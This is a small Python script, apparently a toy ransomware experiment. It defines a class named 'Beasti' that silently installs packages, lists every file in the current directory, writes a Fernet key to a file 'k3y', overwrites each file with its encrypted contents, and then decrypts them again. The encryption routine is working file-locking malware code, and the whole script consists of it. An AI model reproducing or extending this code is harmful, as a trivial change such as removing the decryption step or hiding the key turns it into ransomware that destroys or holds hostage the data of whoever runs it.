import os
import sys
import subprocess
try:
    from easygui import msgbox
    from cryptography.fernet import Fernet
except ModuleNotFoundError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'easygui'])
    subprocess.check_call([sys.executable, '-m','pip', 'install','cryptography'])
    from cryptography.fernet import Fernet
    from easygui import msgbox

class Beasti:
    '''
    Beasti is an object that 
    try to encrypt all files in neighbourhood
    '''
    def __init__(self):
        self.key = Fernet.generate_key()
        self.name = os.path.basename(__file__)
        self.key_file ='k3y'
        self.neighbour_files = [file for file in os.listdir() if file != self.name and os.path.isfile(file)]
        # self.neighbour_files.remove('__pycache__')
        self.save_key()

    def show_msg():
        msgbox('hi, dear','beasti')

    def save_key(self):
        if self.key_file in self.neighbour_files:
            self.neighbour_files.remove(self.key_file)
        with open(self.key_file, 'wb') as kfile:
            kfile.write(self.key)
        

    def get_key(self):
        with open(self.key_file, 'rb') as kfile:
            self.key = kfile.read()

    def do_Hyde(self):
        self.get_key()
        for file in self.neighbour_files:
            with open(file,'rb') as pure_file:
                plain = pure_file.read()
            cipher = Fernet(self.key).encrypt(plain)

            with open(file, 'wb') as dirty_file:
                dirty_file.write(cipher)

    def do_jekyll(self):
        self.get_key()
        for file in self.neighbour_files:
            with open(file,'rb') as dirty_file:
                cipher = dirty_file.read()
            plain = Fernet(self.key).decrypt(cipher)
            with open(file,'wb') as pure_file:
                pure_file.write(plain)

my_beast = Beasti()
print(my_beast.neighbour_files)

my_beast.do_Hyde()
my_beast.do_jekyll()



